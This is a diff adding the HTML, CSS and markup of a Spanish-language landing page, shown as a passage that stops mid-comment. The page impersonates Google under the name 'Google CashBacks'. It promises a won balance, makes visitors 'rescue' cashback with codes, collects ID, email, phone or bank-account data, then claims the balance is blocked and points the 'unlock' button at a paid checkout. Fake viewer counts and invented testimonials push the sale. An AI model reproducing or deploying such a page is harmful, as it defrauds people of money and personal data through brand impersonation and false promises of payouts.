@@ -1,0 +1,1948 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google CashBacks - Retira tu Dinero</title>
+    
+<script
+  src="scripts/utms/latest.js"
+  async
+  defer
+></script>
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "ux9lu7cjw2");
+</script>
+    
+
+    <!-- ============ CONVERTEAI SCRIPTS ============ -->
+    <script>!function(i,n){i._plt=i._plt||(n&&n.timeOrigin?n.timeOrigin+n.now():Date.now())}(window,performance);</script>
+    <link rel="preload" href="924aadb2-040d-493b-978e-1770b079468f/ab-test/69558bcf2abd0da980dfb59a/player.js" as="script">
+    <link rel="preload" href="lib/js/smartplayer-wc/v4/smartplayer.js" as="script">
+    <link rel="preload" href="6dcf6846-12ab-4916-9ce8-4003dce97318/693c6d730cac63a72de4810a/main.m3u8" as="fetch">
+    <link rel="dns-prefetch" href="https://cdn.converteai.net">
+    <link rel="dns-prefetch" href="https://scripts.converteai.net">
+    <link rel="dns-prefetch" href="https://images.converteai.net">
+    <link rel="dns-prefetch" href="https://api.vturb.com.br">
+    <!-- ============ FIN CONVERTEAI SCRIPTS ============ -->
+
+    <link href="css2" rel="stylesheet">
+    <style>
+        :root {
+            --google-blue: #4285F4;
+            --google-red: #EA4335;
+            --google-yellow: #FBBC05;
+            --google-green: #34A853;
+            --bg-light: #E8F0FE;
+            --bg-page: #F8F9FA;
+            --surface: #FFFFFF;
+            --text-dark: #202124;
+            --text-muted: #5F6368;
+            --border: #DADCE0;
+            --danger: #DC3545;
+            --shadow: 0 1px 3px rgba(60,64,67,0.15), 0 1px 2px rgba(60,64,67,0.1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--bg-page);
+            min-height: 100vh;
+            color: var(--text-dark);
+            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Header Section */
+        .header-section {
+            background: var(--bg-light);
+            padding: 24px 16px 20px;
+            text-align: center;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .google-logo {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 12px;
+        }
+
+        .google-text {
+            font-family: 'Product Sans', 'Roboto', sans-serif;
+            font-size: 2.2rem;
+            font-weight: 400;
+            letter-spacing: -1px;
+        }
+
+        .google-text .g { color: var(--google-blue); }
+        .google-text .o1 { color: var(--google-red); }
+        .google-text .o2 { color: var(--google-yellow); }
+        .google-text .g2 { color: var(--google-blue); }
+        .google-text .l { color: var(--google-green); }
+        .google-text .e { color: var(--google-red); }
+
+        .cashbacks-text {
+            font-family: 'Product Sans', 'Roboto', sans-serif;
+            font-size: 1.1rem;
+            color: var(--text-muted);
+            font-weight: 400;
+            margin-top: -4px;
+        }
+
+        .header-description {
+            color: var(--text-muted);
+            font-size: 0.8rem;
+            max-width: 500px;
+            margin: 0 auto 16px;
+            line-height: 1.4;
+        }
+
+        /* Balance Display */
+        .balance-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            max-width: 400px;
+            margin: 0 auto;
+            flex-wrap: wrap;
+        }
+
+        .balance-label {
+            color: var(--text-muted);
+            font-size: 0.85rem;
+        }
+
+        .balance-display {
+            background: var(--google-green);
+            color: white;
+            padding: 10px 32px;
+            border-radius: 6px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            min-width: 160px;
+            text-align: center;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .balance-display.pop {
+            transform: scale(1.05);
+            box-shadow: 0 4px 20px rgba(52, 168, 83, 0.4);
+        }
+
+        /* Progress Section */
+        .progress-section {
+            background: var(--surface);
+            padding: 12px 16px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .progress-info {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 6px;
+            font-size: 0.75rem;
+            color: var(--text-muted);
+        }
+
+        .progress-bar {
+            height: 5px;
+            background: var(--border);
+            border-radius: 100px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: var(--google-green);
+            border-radius: 100px;
+            transition: width 0.6s ease;
+        }
+
+        /* Main Content */
+        .main-content {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px 16px;
+            flex: 1;
+        }
+
+        /* Step Screens */
+        .step {
+            display: none;
+            opacity: 0;
+            transform: translateY(20px);
+            transition: all 0.4s ease;
+        }
+
+        .step.active {
+            display: block;
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        /* Cards */
+        .card {
+            background: var(--surface);
+            border-radius: 10px;
+            padding: 24px 20px;
+            box-shadow: var(--shadow);
+            text-align: center;
+            border: 1px solid var(--border);
+        }
+
+        .card-title {
+            font-size: 1.4rem;
+            font-weight: 500;
+            color: var(--text-dark);
+            margin-bottom: 12px;
+        }
+
+        .card-text {
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            line-height: 1.5;
+            margin-bottom: 6px;
+        }
+
+        .highlight-green {
+            color: var(--google-green);
+            font-weight: 700;
+        }
+
+        /* Highlight Box */
+        .highlight-box {
+            background: linear-gradient(135deg, #E6F4EA 0%, #D4EDDA 100%);
+            border: 2px solid var(--google-green);
+            border-radius: 10px;
+            padding: 16px 20px;
+            margin: 16px 0;
+            font-size: 1rem;
+        }
+
+        .highlight-box span {
+            color: var(--text-dark);
+        }
+
+        .highlight-box strong {
+            color: var(--google-green);
+            font-size: 1.1rem;
+        }
+
+        /* Welcome Info */
+        .welcome-info {
+            margin: 20px 0;
+            text-align: center;
+        }
+
+        .welcome-info p {
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            margin-bottom: 6px;
+            line-height: 1.5;
+        }
+
+        /* Buttons */
+        .btn-google {
+            width: 100%;
+            max-width: 320px;
+            padding: 12px 24px;
+            background: var(--google-green);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 0.9rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-family: 'Roboto', sans-serif;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-top: 12px;
+        }
+
+        .btn-google:hover {
+            background: #2E9549;
+            box-shadow: 0 4px 12px rgba(52, 168, 83, 0.3);
+        }
+
+        .btn-google:active {
+            transform: scale(0.98);
+        }
+
+        .btn-google.btn-danger {
+            background: var(--danger);
+        }
+
+        .btn-google.btn-danger:hover {
+            background: #c82333;
+        }
+
+        .btn-google.btn-gray {
+            background: var(--text-muted);
+        }
+
+
+
+        /* Scratch Card */
+        .scratch-value-box {
+            background: #E6F4EA;
+            border-radius: 8px;
+            padding: 14px;
+            margin-bottom: 16px;
+            border: 1px solid rgba(52, 168, 83, 0.2);
+        }
+
+        .scratch-value-label {
+            font-size: 0.7rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 2px;
+        }
+
+        .scratch-value-amount {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--google-green);
+        }
+
+        .scratch-code {
+            width: 100%;
+            height: 100%;
+            background: #E6F4EA;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            border: 2px dashed var(--google-green);
+            border-radius: 10px;
+        }
+
+        .scratch-code-label {
+            font-size: 0.6rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 2px;
+        }
+
+        .scratch-code-value {
+            font-family: 'Roboto Mono', monospace;
+            font-size: 1.8rem;
+            font-weight: 700;
+            letter-spacing: 6px;
+            color: var(--text-dark);
+        }
+
+        .coupon-instruction {
+            color: var(--text-muted);
+            font-size: 0.8rem;
+            margin-bottom: 12px;
+        }
+
+        .coupon-input-container {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+            margin-bottom: 16px;
+        }
+
+        .coupon-input {
+            width: 42px;
+            height: 48px;
+            border: 2px solid var(--border);
+            border-radius: 6px;
+            text-align: center;
+            font-size: 1.1rem;
+            font-weight: 700;
+            transition: all 0.2s ease;
+            text-transform: uppercase;
+            font-family: 'Roboto', sans-serif;
+        }
+
+        .coupon-input:focus {
+            outline: none;
+            border-color: var(--google-blue);
+            box-shadow: 0 0 0 3px rgba(66, 133, 244, 0.2);
+        }
+
+        .coupon-input.filled {
+            background: var(--bg-light);
+            border-color: var(--google-blue);
+        }
+
+        .error-message {
+            color: var(--google-red);
+            font-size: 0.8rem;
+            margin-bottom: 12px;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+            animation: shake 0.5s ease;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+
+        /* Loading State */
+        .loading-container {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 16px;
+            opacity: 0;
+            transition: all 0.3s ease;
+        }
+
+        .loading-container.show {
+            display: flex;
+            opacity: 1;
+        }
+
+        .google-loader {
+            display: flex;
+            gap: 6px;
+            margin-bottom: 16px;
+        }
+
+        .google-loader span {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            animation: bounce 1.4s ease-in-out infinite;
+        }
+
+        .google-loader span:nth-child(1) { background: var(--google-blue); animation-delay: 0s; }
+        .google-loader span:nth-child(2) { background: var(--google-red); animation-delay: 0.2s; }
+        .google-loader span:nth-child(3) { background: var(--google-yellow); animation-delay: 0.4s; }
+        .google-loader span:nth-child(4) { background: var(--google-green); animation-delay: 0.6s; }
+
+        @keyframes bounce {
+            0%, 80%, 100% { transform: scale(0.6); opacity: 0.6; }
+            40% { transform: scale(1); opacity: 1; }
+        }
+
+        .loading-text {
+            font-weight: 500;
+            color: var(--text-muted);
+            font-size: 0.85rem;
+        }
+
+        /* PIX Form */
+        .pix-options {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin: 16px 0;
+            text-align: left;
+        }
+
+        .pix-option {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 12px;
+            border: 2px solid var(--border);
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .pix-option:hover {
+            border-color: var(--google-blue);
+            background: var(--bg-light);
+        }
+
+        .pix-option.selected {
+            border-color: var(--google-green);
+            background: #E6F4EA;
+        }
+
+        .pix-option input[type="radio"] {
+            display: none;
+        }
+
+        .pix-radio {
+            width: 18px;
+            height: 18px;
+            border: 2px solid var(--border);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            transition: all 0.2s ease;
+        }
+
+        .pix-option.selected .pix-radio {
+            border-color: var(--google-green);
+        }
+
+        .pix-option.selected .pix-radio::after {
+            content: '';
+            width: 8px;
+            height: 8px;
+            background: var(--google-green);
+            border-radius: 50%;
+        }
+
+        .pix-label {
+            font-weight: 500;
+            color: var(--text-dark);
+            font-size: 0.85rem;
+        }
+
+        .pix-input-container {
+            margin-top: 12px;
+            display: none;
+        }
+
+        .pix-input-container.show {
+            display: block;
+        }
+
+        .pix-input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid var(--border);
+            border-radius: 6px;
+            font-size: 0.9rem;
+            font-family: 'Roboto', sans-serif;
+            transition: all 0.2s ease;
+        }
+
+        .pix-input:focus {
+            outline: none;
+            border-color: var(--google-blue);
+            box-shadow: 0 0 0 3px rgba(66, 133, 244, 0.2);
+        }
+
+        .pix-input::placeholder {
+            color: var(--text-muted);
+        }
+
+        /* Blocked Balance Card */
+        .blocked-header {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            padding: 20px;
+            border-radius: 10px 10px 0 0;
+            margin: -24px -20px 0 -20px;
+        }
+
+        /* Success Icon */
+        .success-icon {
+            width: 60px;
+            height: 60px;
+            background: var(--google-green);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+        }
+
+        .success-icon svg {
+            width: 30px;
+            height: 30px;
+            color: white;
+        }
+
+        /* Final Balance Box */
+        .final-balance-box {
+            background: #E6F4EA;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            border: 1px solid rgba(52, 168, 83, 0.2);
+        }
+
+        .final-balance-label {
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            margin-bottom: 4px;
+        }
+
+        .final-balance-value {
+            font-size: 2.2rem;
+            font-weight: 700;
+            color: var(--google-green);
+        }
+
+        /* Info Box */
+        .info-box {
+            background: var(--bg-page);
+            border-radius: 8px;
+            padding: 14px;
+            margin: 16px 0;
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            line-height: 1.5;
+            border: 1px solid var(--border);
+        }
+
+        .blocked-label {
+            color: var(--danger);
+            font-size: 0.75rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 2px;
+        }
+
+        .blocked-amount {
+            color: white;
+            font-size: 2rem;
+            font-weight: 700;
+        }
+
+        .blocked-content {
+            padding-top: 16px;
+        }
+
+        .attention-title {
+            color: var(--danger);
+            font-size: 1.1rem;
+            font-weight: 700;
+            margin-bottom: 12px;
+        }
+
+        .blocked-text {
+            color: var(--text-muted);
+            font-size: 0.85rem;
+            line-height: 1.5;
+            margin-bottom: 8px;
+        }
+
+        .blocked-text strong {
+            color: var(--text-dark);
+        }
+
+        .blocked-highlight {
+            color: var(--google-blue);
+            font-weight: 500;
+            text-decoration: underline;
+        }
+
+        .blocked-buttons {
+            margin-top: 16px;
+        }
+
+        .blocked-buttons .btn-google {
+            margin-top: 10px;
+        }
+
+        /* Confetti */
+        .confetti-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1001;
+            overflow: hidden;
+        }
+
+        .confetti-piece {
+            position: absolute;
+            width: 12px;
+            height: 12px;
+            top: -20px;
+            animation: confettiFall linear forwards;
+        }
+
+        @keyframes confettiFall {
+            0% { transform: translateY(0) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(100vh) rotate(720deg); opacity: 0; }
+        }
+
+        /* Footer */
+        .footer {
+            background: var(--text-dark);
+            padding: 16px;
+            margin-top: 150px;
+        }
+
+        .footer-content {
+            max-width: 500px;
+            margin: 0 auto;
+            text-align: center;
+        }
+
+        .footer-copyright {
+            color: rgba(255,255,255,0.7);
+            font-size: 0.75rem;
+            margin-bottom: 4px;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .footer-links a {
+            color: rgba(255,255,255,0.5);
+            font-size: 0.7rem;
+            text-decoration: none;
+            transition: color 0.2s ease;
+        }
+
+        .footer-links a:hover {
+            color: white;
+        }
+
+        /* Responsive */
+        @media (max-width: 380px) {
+            .google-text { font-size: 1.8rem; }
+            .cashbacks-text { font-size: 1.1rem; }
+            .card { padding: 20px 16px; }
+            .blocked-header { margin: -20px -16px 0 -16px; padding: 16px; }
+            .coupon-input { width: 38px; height: 44px; font-size: 1rem; }
+            .scratch-container { width: 200px; height: 70px; }
+            .scratch-code-value { font-size: 1.5rem; letter-spacing: 4px; }
+            .card-title { font-size: 1.2rem; }
+            .blocked-amount { font-size: 1.6rem; }
+        }
+
+        /* ============ VSL STYLES ============ */
+        .vsl-headline-section {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .vsl-sub-headline {
+            color: var(--text-dark);
+            font-size: 1.2rem;
+            font-weight: 700;
+            line-height: 1.5;
+        }
+
+        .vsl-video-section {
+            position: relative;
+            margin-bottom: 16px;
+        }
+
+        .vsl-video-container {
+            position: relative;
+            background: #000;
+            border-radius: 12px;
+            overflow: hidden;
+            aspect-ratio: 16/9;
+            border: 1px solid var(--border);
+        }
+
+        .vsl-viewers-section {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 16px;
+        }
+
+        .vsl-viewers-counter {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: var(--surface);
+            padding: 10px 20px;
+            border-radius: 25px;
+            font-size: 0.9rem;
+            border: 1px solid var(--border);
+            color: var(--text-dark);
+        }
+
+        .vsl-viewers-counter strong {
+            color: var(--google-red);
+        }
+
+        .vsl-viewers-dot {
+            width: 10px;
+            height: 10px;
+            background: var(--google-red);
+            border-radius: 50%;
+            animation: vslBlink 1.5s infinite;
+        }
+
+        @keyframes vslBlink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.4; }
+        }
+
+        /* VSL Comments */
+        .vsl-comments-section {
+            background: var(--surface);
+            border-radius: 12px;
+            border: 1px solid var(--border);
+            overflow: hidden;
+            margin-bottom: 16px;
+        }
+
+        .vsl-comments-header {
+            padding: 16px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .vsl-comments-title {
+            font-size: 1rem;
+            font-weight: 600;
+            color: var(--text-dark);
+        }
+
+        .vsl-comments-sort {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            cursor: pointer;
+        }
+
+        .vsl-comments-sort svg {
+            width: 16px;
+            height: 16px;
+        }
+
+        .vsl-comments-list {
+            padding: 8px 0;
+        }
+
+        .vsl-comment-item {
+            display: flex;
+            gap: 12px;
+            padding: 12px 16px;
+        }
+
+        .vsl-comment-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.9rem;
+            font-weight: 600;
+            color: white;
+            flex-shrink: 0;
+        }
+
+        .vsl-comment-content {
+            flex: 1;
+        }
+
+        .vsl-comment-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 4px;
+        }
+
+        .vsl-comment-username {
+            font-size: 0.85rem;
+            font-weight: 600;
+            color: var(--text-dark);
+        }
+
+        .vsl-comment-time {
+            font-size: 0.75rem;
+            color: var(--text-muted);
+        }
+
+        .vsl-comment-text {
+            font-size: 0.9rem;
+            color: var(--text-dark);
+            line-height: 1.5;
+            margin-bottom: 8px;
+        }
+
+        .vsl-comment-actions {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .vsl-comment-action {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            cursor: pointer;
+            transition: color 0.2s ease;
+        }
+
+        .vsl-comment-action:hover {
+            color: var(--text-dark);
+        }
+
+        .vsl-comment-action svg {
+            width: 16px;
+            height: 16px;
+        }
+
+        .vsl-comment-action.liked {
+            color: var(--google-blue);
+        }
+
+        .vsl-comments-closed {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            padding: 16px;
+            background: var(--bg-page);
+            border-top: 1px solid var(--border);
+            color: var(--text-muted);
+            font-size: 0.85rem;
+        }
+
+        .vsl-comments-closed svg {
+            width: 18px;
+            height: 18px;
+            color: var(--text-muted);
+        }
+
+        /* VSL Notification Popup */
+        .vsl-notification-popup {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            transform: translateX(-120%);
+            transition: transform 0.4s ease;
+            z-index: 1000;
+            max-width: 300px;
+        }
+
+        .vsl-notification-popup.show {
+            transform: translateX(0);
+        }
+
+        .vsl-notification-icon {
+            width: 40px;
+            height: 40px;
+            background: var(--google-green);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .vsl-notification-icon svg {
+            width: 20px;
+            height: 20px;
+            color: white;
+        }
+
+        .vsl-notification-content {
+            flex: 1;
+        }
+
+        .vsl-notification-title {
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: var(--text-dark);
+            margin-bottom: 2px;
+        }
+
+        .vsl-notification-text {
+            font-size: 0.75rem;
+            color: var(--text-muted);
+        }
+
+        .vsl-notification-text .amount {
+            color: var(--google-green);
+            font-weight: 600;
+        }
+
+        @media (max-width: 480px) {
+            .vsl-notification-popup {
+                left: 10px;
+                right: 10px;
+                max-width: none;
+            }
+        }
+
+        /* Clase para ocultar botón hasta delay */
+        .esconder {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Header Section -->
+    <section class="header-section">
+        <div class="google-logo">
+            <span class="google-text">
+                <span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
+            </span>
+            <span class="cashbacks-text">CashBacks</span>
+        </div>
+        <p class="header-description">
+            Google CashBacks te necesita para recuperar cashbacks que están siendo olvidados todos los días por miles de personas.
+        </p>
+        <div class="balance-row">
+            <span class="balance-label">Tu saldo actual:</span>
+            <div class="balance-display" id="balanceDisplay">$ 100,00</div>
+        </div>
+    </section>
+
+    <!-- Progress Section -->
+    <div class="progress-section">
+        <div class="progress-info">
+            <span>Tu progreso</span>
+            <span id="progressPercent">0%</span>
+        </div>
+        <div class="progress-bar">
+            <div class="progress-fill" id="progressFill" style="width: 0%"></div>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <!-- Step 1: Welcome -->
+        <div class="step active" id="step1">
+            <div class="card">
+                <h1 class="card-title">¡Felicidades! ¡Has sido seleccionado!</h1>
+                <p class="card-text">
+                    Acabas de recibir acceso a la nueva herramienta de Google para recuperar Cashbacks.
+                </p>
+                
+                <div class="highlight-box">
+                    <span>Aprovecha, </span>
+                    <strong>¡ya ganaste $100,00!</strong>
+                </div>
+
+                <div class="welcome-info">
+                    <p>¡Haz 3 rescates y realiza tu primer retiro en minutos!</p>
+                    <p>Haz clic en el botón de abajo y comienza ahora</p>
+                </div>
+
+                <button class="btn-google" onclick="startEvaluations()">
+                    ¡HAZ CLIC AQUÍ Y COMIENZA!
+                </button>
+            </div>
+        </div>
+
+        <!-- Step 2: Scratch Card -->
+        <div class="step" id="stepScratch">
+            <div class="card">
+                <div style="display: inline-flex; align-items: center; gap: 6px; background: var(--bg-light); color: var(--google-blue); padding: 6px 12px; border-radius: 100px; font-size: 0.75rem; font-weight: 500; margin-bottom: 8px;">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+                    </svg>
+                    Rescate <span id="scratchCount">1</span>/3
+                </div>
+                <h2 class="card-title" style="font-size: 1.5rem;">Rescata tu Cashback</h2>
+
+                <div class="scratch-value-box">
+                    <div class="scratch-value-label">Valor a recibir</div>
+                    <div class="scratch-value-amount" id="scratchValueDisplay">$ 0,00</div>
+                </div>
+
+                <div class="scratch-code" style="position: relative; width: 220px; height: 80px; margin: 0 auto 16px; border-radius: 10px;">
+                    <div class="scratch-code-label">Código</div>
+                    <div class="scratch-code-value" id="scratchCodeValue">XXXX</div>
+                </div>
+
+                <p class="coupon-instruction">Escribe el código de arriba para liberar</p>
+
+                <div class="coupon-input-container" id="couponInputContainer">
+                    <input type="text" class="coupon-input" maxlength="1" data-index="0" oninput="handleCouponInput(this)" onkeydown="handleCouponKeyDown(event, this)">
+                    <input type="text" class="coupon-input" maxlength="1" data-index="1" oninput="handleCouponInput(this)" onkeydown="handleCouponKeyDown(event, this)">
+                    <input type="text" class="coupon-input" maxlength="1" data-index="2" oninput="handleCouponInput(this)" onkeydown="handleCouponKeyDown(event, this)">
+                    <input type="text" class="coupon-input" maxlength="1" data-index="3" oninput="handleCouponInput(this)" onkeydown="handleCouponKeyDown(event, this)">
+                </div>
+
+                <p class="error-message" id="couponError">Código incorrecto. Inténtalo de nuevo.</p>
+
+                <button class="btn-google" onclick="verifyCoupon()">
+                    RESCATAR CASHBACK
+                </button>
+            </div>
+        </div>
+
+        <!-- Step 4: Felicidades (después de completar evaluaciones) -->
+        <div class="step" id="stepParabens">
+            <div class="card">
+                <div class="success-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="3">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
+                    </svg>
+                </div>
+                
+                <h1 class="card-title">¡Felicidades! 🎉</h1>
+                <p class="card-text">
+                    ¡Completaste todos los rescates con éxito y tu saldo está disponible para retiro!
+                </p>
+
+                <div class="final-balance-box">
+                    <div class="final-balance-label">Saldo total liberado</div>
+                    <div class="final-balance-value" id="finalBalanceValue">$ 230,00</div>
+                </div>
+
+                <div class="info-box">
+                    Mira una presentación rápida para aprender cómo retirar tu dinero por transferencia bancaria.
+                </div>
+
+                <button class="btn-google" onclick="showVSL()">
+                    VER VIDEO AHORA
+                </button>
+            </div>
+        </div>
+
+        <!-- Step 5: Datos Bancarios -->
+        <div class="step" id="stepPix">
+            <div class="card">
+                <h1 class="card-title">Registrar Cuenta Bancaria</h1>
+                <p class="card-text">
+                    Selecciona el tipo de dato para recibir tu retiro.
+                </p>
+
+                <div class="pix-options">
+                    <label class="pix-option" onclick="selectPixOption(this, 'dni')">
+                        <input type="radio" name="pix-type" value="dni">
+                        <span class="pix-radio"></span>
+                        <span class="pix-label">DNI / Cédula</span>
+                    </label>
+                    <label class="pix-option" onclick="selectPixOption(this, 'email')">
+                        <input type="radio" name="pix-type" value="email">
+                        <span class="pix-radio"></span>
+                        <span class="pix-label">Correo electrónico</span>
+                    </label>
+                    <label class="pix-option" onclick="selectPixOption(this, 'telefono')">
+                        <input type="radio" name="pix-type" value="telefono">
+                        <span class="pix-radio"></span>
+                        <span class="pix-label">Teléfono</span>
+                    </label>
+                    <label class="pix-option" onclick="selectPixOption(this, 'cuenta')">
+                        <input type="radio" name="pix-type" value="cuenta">
+                        <span class="pix-radio"></span>
+                        <span class="pix-label">Número de Cuenta</span>
+                    </label>
+                </div>
+
+                <div class="pix-input-container" id="pixInputContainer">
+                    <input type="text" class="pix-input" id="pixInput" placeholder="Escribe tu dato bancario">
+                </div>
+
+                <button class="btn-google" onclick="realizarSaque()">
+                    REALIZAR RETIRO
+                </button>
+            </div>
+        </div>
+
+        <!-- Step 6: Blocked Balance -->
+        <div class="step" id="stepBlocked">
+            <div class="card" style="padding-bottom: 24px;">
+                <div class="blocked-header">
+                    <div class="blocked-label">SALDO BLOQUEADO</div>
+                    <div class="blocked-amount" id="blockedAmount">$ 230,00</div>
+                </div>
+
+                <div class="blocked-content">
+                    <h2 class="attention-title">¡ATENCIÓN!</h2>
+                    <p class="blocked-text">
+                        Tu saldo ha sido bloqueado temporalmente.
+                    </p>
+                    <p class="blocked-text">
+                        Mira un video corto de <strong>4 minutos</strong> explicando cómo desbloquear tu saldo y cómo funciona el proceso de retiro.
+                    </p>
+
+                    <div class="blocked-buttons">
+                        <button class="btn-google" onclick="redireccionarConUTM('https://app.monetizze.com.br/checkout/DPD369305')">
+                            DESBLOQUEAR SALDO
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Step 7: VSL Page -->
+        <div class="step" id="stepVSL">
+            <!-- Headline Section -->
+            <section class="vsl-headline-section">
+                <p class="vsl-sub-headline">
+                    Mira esta presentación para descubrir cómo retirar tu dinero...
+                </p>
+            </section>
+
+            <!-- Video Section -->
+            <section class="vsl-video-section">
+                <div id="vslPlayerContainer"></div>
+            </section>
+
+            <!-- Botón Checkout  -->
+        
+
+            <!-- Viewers Counter -->
+            <section class="vsl-viewers-section">
+                <div class="vsl-viewers-counter">
+                    <span class="vsl-viewers-dot"></span>
+                    <span><strong id="viewersCount">1.847</strong> personas viendo ahora</span>
+                </div>
+            </section>
+
+            <!-- Comments Section - YouTube Style -->
+            <section class="vsl-comments-section">
+                <div class="vsl-comments-header">
+                    <span class="vsl-comments-title">Comentarios</span>
+                    <div class="vsl-comments-sort">
+                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M3 4h13M3 8h9m-9 4h6m4 0l4-4m0 0l4 4m-4-4v12" />
+                        </svg>
+                        <span>Ordenar por</span>
+                    </div>
+                </div>
+                
+                <div class="vsl-comments-list">
+                    <!-- Comentario 1 -->
+                    <div class="vsl-comment-item">
+                        <div class="vsl-comment-avatar" style="background: linear-gradient(135deg, #4285F4, #34A853)">MG</div>
+                        <div class="vsl-comment-content">
+                            <div class="vsl-comment-header">
+                                <span class="vsl-comment-username">@maria.garcia_mx</span>
+                                <span class="vsl-comment-time">hace 2 horas</span>
+                            </div>
+                            <div class="vsl-comment-text">
+                                ¡No lo podía creer cuando llegó a mi cuenta! 😭 $230 en menos de 10 minutos por transferencia. ¡Muchas gracias por este video, me salvó el mes! 🙏💚
+                            </div>
+                            <div class="vsl-comment-actions">
+                                <div class="vsl-comment-action liked">
